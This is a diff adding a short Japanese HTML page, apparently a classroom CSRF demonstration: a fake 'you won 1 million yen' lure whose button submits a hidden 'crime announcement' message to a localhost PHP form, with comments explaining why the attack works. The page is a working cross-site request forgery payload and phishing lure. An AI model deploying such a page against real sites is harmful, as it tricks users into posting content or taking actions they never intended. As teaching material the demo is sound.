@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="utf-8">
+  <title>当選しました！</title>
+</head>
+
+<body>
+  <h1>おめでとうございます！</h1>
+  <!-- CSRF：URLが知られる -->
+  <form action="http://localhost:8562/3_post/post1_result.php" method="post">
+    <p>100万円が当たりました！下のボタンをクリックしてください！</p>
+    <!-- nameの値が知られる -->
+    <input type="hidden" name="message" value="犯行予告！！！！">
+    <button>今すぐ受け取る！</button>
+  </form>
+</body>
+
+</html>
